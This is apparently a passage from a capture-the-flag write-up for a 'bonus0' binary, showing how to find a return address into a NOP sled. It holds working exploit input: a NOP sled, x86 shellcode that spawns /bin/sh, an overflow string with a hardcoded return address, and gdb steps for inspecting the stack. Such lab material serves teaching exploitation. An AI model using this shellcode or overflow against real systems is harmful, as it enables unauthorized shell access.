## How to find a return address into the NOP sled

Create the same two-line input as the exploit:

```
python - <<'PY' > /tmp/bonus0.in
import sys
shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
sys.stdout.write("\x90"*100 + shell + "\n")
sys.stdout.write("A"*9 + "\xd0\xe6\xff\xbf" + "B"*7 + "\n")
PY
```

In `gdb`:

```
gdb ./bonus0
(gdb) run < /tmp/bonus0.in
```

At the breakpoint, `result` is at `$esp+0x16` (from disassembly). Search nearby:

```
(gdb) x/128bx $esp+0x16
```

